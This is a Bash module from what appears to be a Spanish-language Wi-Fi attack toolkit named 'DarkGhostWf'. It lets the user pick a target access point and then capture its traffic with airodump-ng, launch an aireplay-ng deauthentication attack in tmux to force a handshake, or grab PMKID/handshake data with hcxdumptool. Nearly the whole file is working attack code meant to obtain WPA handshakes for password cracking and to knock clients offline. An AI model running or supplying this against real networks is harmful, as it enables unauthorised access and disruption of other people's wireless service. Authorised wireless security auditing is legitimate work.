#!/bin/bash

# --- Module: Capture ---

function start_capture() {
    echo -e "\n${BLUE}[*] Módulo de Captura (Handshake / PMKID)${NC}"
    
    # Auto-selección de Interfaz
    local iface=$(select_interface)
    [[ -z "$iface" ]] && return

    # Verificar si ya existe un objetivo seleccionado
    local bssid="$TARGET_BSSID"
    local channel="$TARGET_CHANNEL"
    local essid="$TARGET_ESSID"

    if [[ -z "$bssid" ]]; then
        echo -e "${YELLOW}[!] No hay objetivo seleccionado. ¿Quieres escanear uno ahora? (s/n)${NC}"
        read -p "> " scan_now
        if [[ "$scan_now" == "s" ]]; then
            select_network "$iface"
            bssid="$TARGET_BSSID"
            channel="$TARGET_CHANNEL"
            essid="$TARGET_ESSID"
        fi
    fi

    # Si sigue vacío, preguntar manualmente
    if [[ -z "$bssid" ]]; then
        read -p "BSSID del objetivo: " bssid
        read -p "Canal del objetivo: " channel
        read -p "Nombre ESSID (opcional): " essid
    fi

    echo -e "${YELLOW}Nombre para el archivo de salida (Sugerido: ${essid:-capture}): ${NC}"
    read output_name
    output_name="${output_name:-${essid:-capture}}"
    
    local out_path="$LOGS/$output_name"

    echo -e "\n1) Captura Global (airodump-ng)"
    echo "2) Ataque Deauth (aireplay-ng) + Captura"
    echo "3) Captura PMKID (hcxdumptool)"
    read -p "Método: " method

    case $method in
        1)
            echo -e "${GREEN}[*] Iniciando captura... Presione Ctrl+C para finalizar.${NC}"
            airodump-ng -c "$channel" --bssid "$bssid" -w "$out_path" "$iface"
            ;;
        2)
            # Lanzamos la captura en segundo plano o en un nuevo proceso y luego el deauth
            echo -e "${YELLOW}[!] Se recomienda tener dos paneles. ¿Quieres automatizar deauth? (s/n)${NC}"
            read deauth_opt
            if [[ "$deauth_opt" == "s" ]]; then
                echo -e "${BLUE}[*] Lanzando Airodump y Aireplay...${NC}"
                # Aquí lo ideal es usar tmux para que el usuario lo vea
                if tmux has-session -t DarkGhostWf 2>/dev/null; then
                    tmux send-keys -t DarkGhostWf:0.1 "airodump-ng -c $channel --bssid $bssid -w $out_path $iface" C-m
                    tmux split-window -v -p 30 -t DarkGhostWf:0.1
                    tmux send-keys -t DarkGhostWf:0.1 "aireplay-ng -0 5 -a $bssid $iface" C-m
                    tmux attach-session -t DarkGhostWf
                else
                    echo -e "${RED}[!] No hay sesión activa de tmux. Iniciando captura normal...${NC}"
                    airodump-ng -c "$channel" --bssid "$bssid" -w "$out_path" "$iface"
                fi
            fi
            ;;
        3)
            echo -e "${BLUE}[*] Usando hcxdumptool para captura pasiva de PMKID/Handshake...${NC}"
            hcxdumptool -i "$iface" -o "${out_path}.pcapng" --enable_status=1
            echo -e "${GREEN}[+] Captura guardada en ${out_path}.pcapng${NC}"
            ;;
        *) return ;;
    esac
}
